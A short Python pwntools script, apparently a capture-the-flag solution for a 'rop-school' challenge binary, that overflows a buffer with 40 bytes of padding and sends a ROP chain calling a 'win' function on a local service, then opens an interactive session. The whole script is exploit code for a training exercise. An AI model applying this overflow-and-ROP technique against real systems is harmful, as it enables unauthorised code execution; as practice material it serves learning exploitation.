from pwn import *
#context.log_level = 'DEBUG'
context.binary = elf = ELF('./rop-school-dist.o')
p = remote('127.0.0.1',1338)
#p = process('./rop-school-dist.o')

r = ROP(elf)
r.raw("A"*40)
r.win(0x1337, 0x31337)

p.sendline(r.chain())
p.interactive()
